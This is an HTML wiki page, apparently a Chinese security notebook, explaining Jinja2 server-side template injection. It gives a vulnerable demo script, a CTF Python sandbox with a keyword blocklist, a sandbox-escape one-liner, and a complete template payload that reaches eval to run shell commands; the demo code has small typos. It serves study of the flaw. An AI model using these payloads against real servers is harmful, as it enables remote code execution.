@@ -1,0 +1,135 @@
+<!DOCTYPE HTML>
+<html>
+    <head>
+        <link rel="Stylesheet" type="text/css" href="/static/css/style.css">
+        <link rel="Stylesheet" type="text/css" href="/static/css/tango.css">
+        <title>SSTI Jinja2 - Wiki | janes</title>
+        <meta name="keywords" content=""/>
+        <meta name="description" content=""/>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    </head>
+
+    <body>
+        <div id="container">
+            
+<div id="header">
+  <div id="post-nav"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/#WebSecurity">WebSecurity</a>&nbsp;»&nbsp;SSTI Jinja2</div>
+</div>
+<div class="clearfix"></div>
+<div id="title">SSTI Jinja2</div>
+  <div id="content">
+  <h1 id="python-jinja2ssti">python 模板引擎 Jinja2存在服务端模板注入(SSTI)</h1>
+<p><a href="https://twitter.com/nvisium">@nvisium</a> 在其博客发表文章 <a href="https://nvisium.com/blog/2015/12/07/injecting-flask/">《Inject Flask》</a>，控制Jinja模板内容时利用环境变量中已注册的用户自定义函数进行恶意调用或利用渲染进行XSS等</p>
+<p>乌云文章<a href="http://drops.wooyun.org/web/13057"> 利用 Python 特性在 Jinja2 模板中执行任意代码 </a>提到Jinja2模板可以访问一些python内置变量，如 [], {} 等，并且能够使用python变量类型中的一些函数。</p>
+<p>访问的具有特殊意义的字符串：</p>
+<div class="hlcode"><pre><span class="kn">from</span> <span class="nn">Jinja2</span> <span class="kn">import</span> <span class="n">Template</span>
+
+<span class="k">def</span> <span class="nf">inject</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">Template</span><span class="p">(</span><span class="s">&quot;input:{{ </span><span class="si">%s</span><span class="s"> }}&quot;</span> <span class="o">%</span> <span class="n">cmd</span><span class="p">)</span><span class="o">.</span><span class="n">render</span><span class="p">()</span>
+
+<span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">__builtins__</span><span class="o">.</span><span class="n">__dict__</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
+    <span class="n">msg</span> <span class="o">=</span> <span class="n">inject</span><span class="p">(</span><span class="n">f</span><span class="o">+</span><span class="s">&quot;.__class__&quot;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s">&#39;Undefined&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">&quot;{f}: {msg}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">f</span><span class="o">=</span><span class="n">f</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="n">msg</span><span class="p">))</span>
+
+<span class="o">&gt;&gt;&gt;</span>
+<span class="nb">dict</span><span class="p">:</span> <span class="nb">input</span><span class="p">:</span><span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;function&#39;</span><span class="o">&gt;</span>
+<span class="bp">False</span><span class="p">:</span> <span class="nb">input</span><span class="p">:</span><span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;bool&#39;</span><span class="o">&gt;</span>
+<span class="bp">True</span><span class="p">:</span> <span class="nb">input</span><span class="p">:</span><span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;bool&#39;</span><span class="o">&gt;</span>
+<span class="bp">None</span><span class="p">:</span> <span class="nb">input</span><span class="p">:</span><span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;NoneType&#39;</span><span class="o">&gt;</span>
+<span class="nb">range</span><span class="p">:</span> <span class="nb">input</span><span class="p">:</span><span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;type&#39;</span><span class="o">&gt;</span>
+</pre></div>
+
+
+<p>Jinja模板执行python代码，官方说明是需要在模板环境中注册函数才能在模板中调用。</p>
+<div class="hlcode"><pre><span class="c"># file: demo1.py</span>
+
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="n">form</span> <span class="n">jinja2</span> <span class="kn">import</span> <span class="nn">Template</span>
+
+<span class="n">template</span> <span class="o">=</span> <span class="n">Template</span><span class="p">(</span><span class="s">&quot;input: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="s">&#39;&lt;empty&gt;&#39;</span><span class="p">))</span>
+<span class="n">tempalte</span><span class="o">.</span><span class="k">global</span><span class="p">[</span><span class="s">&#39;os&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">os</span>
+<span class="k">print</span> <span class="n">tempalte</span><span class="o">.</span><span class="n">render</span><span class="p">()</span>
+
+
+<span class="o">&gt;&gt;&gt;</span><span class="n">python</span> <span class="n">demo1</span><span class="o">.</span><span class="n">py</span> <span class="s">&quot;{{ os.popen(&quot;</span><span class="n">echo</span> <span class="n">hello</span><span class="s">&quot;).read() }}&quot;</span>
+<span class="nb">input</span><span class="p">:</span> <span class="n">hello</span>
+</pre></div>
+
+
+<h2 id="python">利用python特性直接执行任意代码</h2>
+<p>python沙盒逃逸, 参考: <a href="https://hexplo.it/escaping-the-csawctf-python-sandbox/">CSAW-CTF Python sandbox write-up</a></p>
+<div class="hlcode"><pre><span class="c"># file: sandbox.py</span>
+
+<span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">&quot;Welcome to my Python sandbox! Enter commands below!&quot;</span><span class="p">)</span>
+
+<span class="n">banned</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="s">&quot;import&quot;</span><span class="p">,</span>
+    <span class="s">&quot;exec&quot;</span><span class="p">,</span>
+    <span class="s">&quot;eval&quot;</span><span class="p">,</span>
+    <span class="s">&quot;pickle&quot;</span><span class="p">,</span>
+    <span class="s">&quot;os&quot;</span><span class="p">,</span>
+    <span class="s">&quot;subprocess&quot;</span><span class="p">,</span>
+    <span class="s">&quot;kevin sucks&quot;</span><span class="p">,</span>
+    <span class="s">&quot;input&quot;</span><span class="p">,</span>
+    <span class="s">&quot;banned&quot;</span><span class="p">,</span>
+    <span class="s">&quot;cry sum more&quot;</span><span class="p">,</span>
+    <span class="s">&quot;sys&quot;</span>
+<span class="p">]</span>
+
+<span class="n">targets</span> <span class="o">=</span> <span class="n">__builtins__</span><span class="o">.</span><span class="n">__dict__</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span>
+<span class="n">targets</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s">&#39;raw_input&#39;</span><span class="p">)</span>
+<span class="n">targets</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s">&#39;print&#39;</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">targets</span><span class="p">:</span>
+    <span class="k">del</span> <span class="n">__builtins__</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="n">x</span><span class="p">]</span>
+
+<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">&quot;&gt;&gt;&gt;&quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">&#39; &#39;</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">no</span> <span class="ow">in</span> <span class="n">banned</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">no</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">data</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">&quot;No bueno&quot;</span><span class="p">)</span>
+            <span class="k">break</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">exec</span> <span class="n">data</span>
+</pre></div>
+
+
+<div class="hlcode"><pre><span class="n">python</span> <span class="n">sandbox</span><span class="p">.</span><span class="n">py</span>
+
+<span class="n">Welcome</span> <span class="n">to</span> <span class="n">my</span> <span class="n">Python</span> <span class="n">sandbox</span><span class="o">!</span> <span class="n">Enter</span> <span class="n">commands</span> <span class="n">below</span><span class="o">!</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="p">[</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="n">in</span> <span class="p">[].</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">c</span><span class="p">.</span><span class="n">__name__</span> <span class="o">==</span> <span class="err">&#39;</span><span class="n">catch_warnings</span><span class="err">&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">func_globals</span><span class="p">[</span><span class="err">&#39;</span><span class="n">linecache</span><span class="err">&#39;</span><span class="p">].</span><span class="n">__dict__</span><span class="p">[</span><span class="sc">&#39;o&#39;</span><span class="o">+</span><span class="sc">&#39;s&#39;</span><span class="p">].</span><span class="n">__dict__</span><span class="p">[</span><span class="err">&#39;</span><span class="n">sy</span><span class="sc">&#39;+&#39;</span><span class="n">stem</span><span class="err">&#39;</span><span class="p">](</span><span class="err">&#39;</span><span class="n">echo</span> <span class="n">hello</span> <span class="n">sandbox</span><span class="err">&#39;</span><span class="p">)</span>
+<span class="n">hello</span> <span class="n">sandbox</span>
+</pre></div>
+
+
+<h2 id="jiaja2">结合沙盒逃逸Jiaja2模板任意代码执行</h2>
+<p>Jinja2 模板payload</p>
+<div class="hlcode"><pre><span class="cp">{%</span> <span class="k">for</span> <span class="nv">c</span> <span class="k">in</span> <span class="o">[]</span><span class="nv">.__class__.__base__.__subclasses__</span><span class="o">()</span> <span class="cp">%}</span><span class="x"></span>
+<span class="cp">{%</span> <span class="k">if</span> <span class="nv">c.__name__</span> <span class="o">==</span> <span class="s1">&#39;catch_warnings&#39;</span> <span class="cp">%}</span><span class="x"></span>
+<span class="x">  </span><span class="cp">{%</span> <span class="k">for</span> <span class="nv">b</span> <span class="k">in</span> <span class="nv">c.__init__.func_globals.values</span><span class="o">()</span> <span class="cp">%}</span><span class="x"></span>
+<span class="x">  </span><span class="cp">{%</span> <span class="k">if</span> <span class="nv">b.__class__</span> <span class="o">==</span> <span class="o">{}</span><span class="nv">.__class__</span> <span class="cp">%}</span><span class="x"></span>
+<span class="x">    </span><span class="cp">{%</span> <span class="k">if</span> <span class="s1">&#39;eval&#39;</span> <span class="k">in</span> <span class="nv">b.keys</span><span class="o">()</span> <span class="cp">%}</span><span class="x"></span>
+<span class="x">      </span><span class="cp">{{</span> <span class="nv">b</span><span class="o">[</span><span class="s1">&#39;eval&#39;</span><span class="o">](</span><span class="s1">&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;</span><span class="o">)</span> <span class="cp">}}</span><span class="x"></span>
+<span class="x">    </span><span class="cp">{%</span> <span class="k">endif</span> <span class="cp">%}</span><span class="x"></span>
+<span class="x">  </span><span class="cp">{%</span> <span class="k">endif</span> <span class="cp">%}</span><span class="x"></span>
+<span class="x">  </span><span class="cp">{%</span> <span class="k">endfor</span> <span class="cp">%}</span><span class="x"></span>
+<span class="cp">{%</span> <span class="k">endif</span> <span class="cp">%}</span><span class="x"></span>
+<span class="cp">{%</span> <span class="k">endfor</span> <span class="cp">%}</span><span class="x"></span>
+</pre></div>
+</div>
+
+        </div>
+        <div id="footer">
+            <span>
+                Copyright © 2012-2016 .
+                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
+            </span>
+        </div>
+        
+    </body>
+</html>
